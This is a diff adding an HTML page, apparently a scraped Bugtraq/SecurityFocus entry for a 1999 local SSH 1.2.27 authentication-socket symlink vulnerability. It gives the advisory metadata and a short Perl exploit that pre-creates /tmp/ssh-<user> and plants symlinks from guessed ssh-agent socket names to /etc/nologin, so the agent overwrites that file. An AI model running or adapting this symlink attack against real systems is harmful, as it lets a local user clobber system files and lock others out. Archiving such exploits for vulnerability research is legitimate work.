@@ -1,0 +1,131 @@
+#SpeeDr00t@Black Falcon<br>#bid660<p><b><span style="font-size: 18pt;">SSH Authentication Socket File Creation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/660/info">info</a><br><a href="http://www.securityfocus.com/bid/660/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/660/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/660/solution">solution</a><br><a href="http://www.securityfocus.com/bid/660/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				660
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 17 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 17 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was found by Tymm Twillman &lt;tymm@coe.missouri.edu&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SSH Communications Security SSH 1.2.27 <br/>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	#!/usr/bin/perl<br/><br/>$pid = $$;<br/><br/>$whoami = `whoami`;<br/>chop($whoami);<br/>mkdir("/tmp/ssh-$whoami", 0700);<br/><br/>for ($i = $pid; $i &lt; $pid+50; $i++)<br/>{<br/>  symlink("/etc/nologin", "/tmp/ssh-$whoami/ssh-$i-agent");<br/>}
+	
+		<ul>
+</ul>
+</div>
